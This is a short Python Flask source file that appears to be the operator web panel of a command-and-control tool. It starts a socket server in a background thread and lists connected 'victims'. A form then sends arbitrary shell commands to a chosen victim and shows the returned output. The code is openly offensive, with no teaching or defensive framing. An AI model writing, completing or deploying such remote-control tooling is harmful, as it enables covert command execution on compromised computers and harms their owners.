import threading
import time
from flask import Flask, render_template, request
from command_handler import CommandHandler

app = Flask(__name__)
command_handler = CommandHandler()

isFirstReq: bool = True

@app.before_request
def init_server():
    global isFirstReq
    if isFirstReq:
        isFirstReq = False
        s1 = threading.Thread(target=command_handler.server_socket)
        s1.start()
    return

@app.route("/")
@app.route("/victims")
def victims():
    return render_template('victims.html', threads=command_handler.threads)

@app.route("/<victimname>/execute", methods=['GET', 'POST'])
def execute(victimname):
    if request.method == 'POST':
        cmd = request.form['command']
        for i in command_handler.threads:
            if victimname in i.name:
                req_index = command_handler.threads.index(i)
                command_handler.commands[req_index] = cmd
                time.sleep(1)
                output = command_handler.answers[req_index]
                return render_template('execute.html', output=output, victimname=victimname)
    return render_template("execute.html", victimname=victimname)

if __name__ == '__main__':
    app.run(debug=True)
